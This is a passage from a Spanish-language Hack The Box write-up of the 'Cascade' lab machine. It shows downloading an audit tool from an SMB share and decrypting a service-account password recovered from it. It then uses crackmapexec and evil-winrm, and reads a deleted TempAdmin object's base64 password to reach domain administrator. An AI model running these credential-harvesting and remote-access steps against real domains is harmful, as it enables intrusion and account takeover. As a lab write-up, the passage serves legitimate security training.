  <li>Vamos a conectarnos a <code class="language-plaintext highlighter-rouge">Audit$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.10.182/Audit<span class="nv">$ </span><span class="nt">-U</span> s.smith%sT333ve2
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Jan 29 12:01:26 2020
  ..                                  D        0  Wed Jan 29 12:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 15:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 12:00:20 2020
  DB                                  D        0  Tue Jan 28 15:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 17:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 01:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 01:38:38 2019
  x64                                 D        0  Sun Jan 26 16:25:27 2020
  x86                                 D        0  Sun Jan 26 16:25:27 2020

		6553343 blocks of size 4096. 1624921 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos todo eso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> prompt OFF
smb: <span class="se">\&gt;</span> recurse ON
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\C</span>ascAudit.exe of size 13312 as CascAudit.exe <span class="o">(</span>30.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 30.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\C</span>ascCrypto.dll of size 12288 as CascCrypto.dll <span class="o">(</span>34.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 32.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\R</span>unAudit.bat of size 45 as RunAudit.bat <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 22.5 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\S</span>ystem.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll <span class="o">(</span>444.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 198.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\S</span>ystem.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll <span class="o">(</span>130.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 169.9 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\D</span>B<span class="se">\A</span>udit.db of size 24576 as DB/Audit.db <span class="o">(</span>70.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 160.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\x</span>64<span class="se">\S</span>QLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll <span class="o">(</span>1431.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 458.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\x</span>86<span class="se">\S</span>QLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll <span class="o">(</span>923.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 559.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si vemos el archivo <code class="language-plaintext highlighter-rouge">.bat</code> lo único que hace es correr el binario y pone la información en un <code class="language-plaintext highlighter-rouge">.db</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>RunAudit.bat
CascAudit.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">CASC-DC1</span><span class="se">\A</span><span class="s2">udit</span><span class="nv">$\</span><span class="s2">DB</span><span class="se">\A</span><span class="s2">udit.db"</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">.db</code> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  DB file Audit.db
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
</code></pre></div></div>

<ul>
  <li>Podemos <code class="language-plaintext highlighter-rouge">dumpear</code> la información usando <code class="language-plaintext highlighter-rouge">sqlite3</code> comenzamos por las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  DB sqlite3 Audit.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .tables
DeletedUserAudit  Ldap              Misc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver lo que contienen las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qlite&gt; <span class="k">select</span> <span class="k">*</span> from DeletedUserAudit<span class="p">;</span>
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN<span class="o">=</span>Test<span class="se">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN<span class="o">=</span>deleted guy<span class="se">\0</span>ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN<span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>sqlite&gt; <span class="k">select</span> <span class="k">*</span> from Ldap<span class="p">;</span>
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw<span class="o">==</span>|cascade.local
sqlite&gt; <span class="k">select</span> <span class="k">*</span> from Misc<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>No vemos nada interesante.</p>
  </li>
  <li>
    <p>Vamos a pasar el binario a una maquina Windows para examinarlo con <code class="language-plaintext highlighter-rouge">DNSpy</code> <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content file CascAudit.exe
CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows, 3 sections
</code></pre></div></div>

<ul>
  <li>En esta parte del código encontramos una contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/code.png" />
</p>

<ul>
  <li>
    <p>La <code class="language-plaintext highlighter-rouge">key</code> se utiliza al momento de cifrar la contraseña <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code>.</p>
  </li>
  <li>
    <p>Si vemos allí llama ala <code class="language-plaintext highlighter-rouge">dll</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/code2.png" />
</p>

<ul>
  <li>
    <p>Vamos a debugear el <code class="language-plaintext highlighter-rouge">dll</code> ya que allí se hace lo del proceso de cifrar la contraseña.</p>
  </li>
  <li>
    <p>Podemos ver el <code class="language-plaintext highlighter-rouge">DefaultIV</code> <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code> además de saber que se usa  <code class="language-plaintext highlighter-rouge">CipherMode.CBC</code> .</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/ex.png" />
</p>

<ul>
  <li>
    <p>La password es la que encontramos en el sqlite3 <code class="language-plaintext highlighter-rouge">1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local</code>.</p>
  </li>
  <li>
    <p>Si le pasamos lo que nos pide hacer el <code class="language-plaintext highlighter-rouge">decrypt</code> <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code> nos da la contraseña en texto plano.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/pass.png" />
</p>

<ul>
  <li>Si vemos si las credenciales son correctas vemos que si.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> arksvc <span class="nt">-p</span> w3lc0meFr31nd
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>rksvc:w3lc0meFr31nd <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.182 <span class="nt">-u</span> <span class="s1">'arksvc'</span> <span class="nt">-p</span> <span class="s1">'w3lc0meFr31nd'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>cascade<span class="se">\a</span>rksvc
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User<span class="s1">'s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></code></pre></div></div>

<blockquote>
  <p>Cuando la Papelera de Reciclaje de AD está habilitada, los objetos de Active Directory que son eliminados no se eliminan de forma permanente de inmediato. En lugar de eso, pasan a un estado denominado “logical delete” o eliminación lógica. Durante este período, los objetos pueden ser restaurados completamente, incluyendo todos sus atributos y configuraciones de seguridad anteriores, como si nunca hubiesen sido eliminados.</p>
</blockquote>

<ul>
  <li><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/chota.png" />
</p>

<ul>
  <li>Con este comando podemos ver objetos borrados.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-filter</span> <span class="s1">'isDeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="nt">-includeDeletedObjects</span>


Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos sobre <code class="language-plaintext highlighter-rouge">TempAdmin</code> si recordamos en el correo nos decían que la contraseña de ese usuario era la misma que la del <code class="language-plaintext highlighter-rouge">admin</code>.</p>
  </li>
  <li>
    <p>Podemos listar las propiedades y encontramos una contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-filter</span> <span class="s1">'isDeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="nt">-includeDeletedObjects</span> <span class="nt">-Properties</span> <span class="k">*</span>


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM<span class="o">}</span>
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Computers,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1<span class="err">$</span>
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
CN                              : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
Created                         : 1/13/2020 5:21:53 PM
createTimeStamp                 : 1/13/2020 5:21:53 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...<span class="o">}</span>
groupType                       : <span class="nt">-2147483644</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/28/2020 6:07:55 PM
modifyTimeStamp                 : 1/28/2020 6:07:55 PM
msDS-LastKnownRDN               : Scheduled Tasks
Name                            : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : group
ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
ProtectedFromAccidentalDeletion : False
sAMAccountName                  : Scheduled Tasks
sDRightsEffective               : 0
uSNChanged                      : 245848
uSNCreated                      : 114790
whenChanged                     : 1/28/2020 6:07:55 PM
whenCreated                     : 1/13/2020 5:21:53 PM

CanonicalName                   : cascade.local/Deleted Objects/<span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
CN                              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
Created                         : 1/26/2020 2:34:30 AM
createTimeStamp                 : 1/26/2020 2:34:30 AM
Deleted                         : True
Description                     :
DisplayName                     : Block Potato
DistinguishedName               : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
flags                           : 0
gPCFileSysPath                  : <span class="se">\\</span>cascade.local<span class="se">\S</span>ysVol<span class="se">\c</span>ascade.local<span class="se">\P</span>olicies<span class="se">\{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
gPCFunctionalityVersion         : 2
gPCMachineExtensionNames        : <span class="o">[{</span>35378EAC-683F-11D2-A89A-00C04FBBCFA2<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}][{</span>B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}]</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
Name                            : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : groupPolicyContainer
ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196701
uSNCreated                      : 196688
versionNumber                   : 2
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:30 AM

CanonicalName                   : cascade.local/Deleted Objects/Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
CN                              : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : Machine
Name                            : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196699
uSNCreated                      : 196689
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

CanonicalName                   : cascade.local/Deleted Objects/User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
CN                              : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : User
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
</code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz</code>.</p>
  </li>
  <li>
    <p>Vemos la contraseña en texto plano.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo </span>YmFDVDNyMWFOMDBkbGVz | <span class="nb">base64</span> <span class="nt">-d</span>
baCT3r1aN00dles
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Comprobamos que son sus credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> administrator <span class="nt">-p</span> baCT3r1aN00dles
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>dministrator:baCT3r1aN00dles <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
